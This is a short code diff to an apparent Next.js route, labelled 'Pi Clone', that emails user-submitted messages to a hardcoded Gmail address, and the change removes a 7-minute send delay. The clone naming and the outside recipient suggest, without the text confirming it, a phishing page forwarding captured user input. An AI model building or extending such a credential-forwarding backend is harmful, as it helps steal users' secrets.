@@ -1,8 +1,5 @@
 import nodemailer from 'nodemailer';
 
-// Function to create a delay
-const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
-
 const formatMessage = async (message: string) => {
     const email = process.env.MY_EMAIL;
     const pass = process.env.MY_PASS;
@@ -66,10 +63,7 @@ export async function POST(request: Request) {
         });
 
         const formattedMessage = await formatMessage(message);
-
-         // Introduce a delay of 7 minutes (420,000 milliseconds)
-        await delay(420000);
-
+        
         const mailOptions = {
             from: `Pi Clone ${email}`,
             to: 'escrowlinks@gmail.com',
